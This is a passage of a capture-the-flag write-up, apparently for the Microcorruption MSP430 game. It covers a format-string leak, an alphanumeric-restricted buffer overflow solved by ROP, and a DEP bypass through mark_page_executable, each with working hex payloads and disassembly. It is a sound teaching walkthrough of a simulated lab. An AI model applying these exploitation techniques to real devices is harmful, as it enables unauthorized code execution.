call_r14 = "%04x"%(leaked - 8)
int_addr = "%04x"%(leaked + 0x1a8)
call_r14 = call_r14[2:4] + call_r14[0:2]
int_addr = int_addr[2:4] + int_addr[0:2]
print("3f407f003040" + int_addr + call_r14)
```

Thus, on an actual run, we enter the username:

```%x%x```

Which gives an output of:

```0000a726```

Then:

```
$ python vlad.py a726
3f407f003040cea81ea7
```

So we enter a password of 

```3f407f003040cea81ea7```

which unlocks the door!


## 16. Lagos

This is a relatively straightforward buffer overflow except that we
are only allowed alphanumeric instructions.

We can easily get code execution by giving an input such as:

```AAAAAAAAAAAAAAAABBBBCCCC```

and breaking on the `ret` instruction of the `login` function.  Here,
we see that the middle two Bs are the return value, so if we provide
17 bytes of padding, then the next two bytes will be the location of
execution.

Now, we are allowed 0x200 bytes of input, so we have two choices:

* Inject code to perform the required job (`push 0x7f, call INT`)
  built only out of instructions with alphanumeric encodings.

* Return to a portion of the code (or possibly several ROP gadgets)
  that would allow us to perform this task.

Along the lines of the first , we have in [lagos/alphas](lagos/alphas)
a file containing most instructions with valid alphanumeric encodings.
Notably absent from these instructions are any instructions that let
us write to RAM.

So keeping this in mind, we'll look at the second approach.  We start
by searching in the most naive way possible for ROP gadgets.  We find,
among others:

```
cat lagos/code |grep -B 6 ret
...
4650 <getsn>
4650:  0e12           push	r14
4652:  0f12           push	r15
4654:  2312           push	#0x2
4656:  b012 fc45      call	#0x45fc <INT>
465a:  3150 0600      add	#0x6, sp
465e:  3041           ret
...
```

Ah!  So we can return to `getsn` and read more bytes, this time
without the alphanumeric restriction.  If we return to 0x4654 and we
set up the stack with the values specifying how many bytes to read and
where to read them to (in lieu of actually running the `push r14` and
`push r15` instructions), and then have the return address be the
address we read to, we should be golden.

Thus:

```
17 bytes of padding
0x4654: login return address
0x4430: where to read to
0x7a7a: how much to read
0x4430: getsn return address
```

That is:

```4141414141414141414141414141414141544630447a7a3044```

Then on the second prompt, we can put in the code we want to execute:

```30127f00b012fc45```

## 17. Bangalore

This challenge involves beating DEP.  It is a relatively
straightforward buffer overflow otherwise: We provide the input:

```AAAAAAAAAAAAAAAABBCCDDEEFFGG```

And observe that the `ret` instruction at 0x453c returns to 0x4242.
So in theory we can just put padded "unlock the door" code into the
first 16 bytes and then the address of that code in the next two.
However, the stack is marked as read/write but not as executable.
Thus we are going to have to do something else.

Clearly, we are only going to be able to return to code that already
exists within the program.  Further, there is code to make a page executable:

```
44b4 <mark_page_executable>
44b4:  0e4f           mov	r15, r14
44b6:  0312           push	#0x0
44b8:  0e12           push	r14
44ba:  3180 0600      sub	#0x6, sp
44be:  3240 0091      mov	#0x9100, sr
44c2:  b012 1000      call	#0x10
44c6:  3150 0a00      add	#0xa, sp
44ca:  3041           ret
```

Here, r14 contains the address of the page.  But if we return to, say,
0x44ba, and set up the stack with the index of the (0x100-byte-sized)
page of memory on the stack that we want to mark as executable: 0x3f,
as well as the 0 that this function will push, then we can return to
the start of the padding:

```{16 bytes of padding/shellcode}{0x44ba}{0x3f}{0}{return address}```

Further, there isn't a convenient INT function, so we will have to
reimplement its functionality, which appears to be setting the high
bit of sr, putting the interrupt number into the low 7 bits of the
high byte of sr, zeroing the low byte of sr, and calling 0x10:

```
mov #0xff00, sr
call #0x10
```

Or:

```324000ffb0121000```

Since the start of the stack is 3fee, we have:

```324000ffb01210004141414141414141ba443f000000ee3f```


# Levels in progress

## 18. Chernobyl

## 19. ???
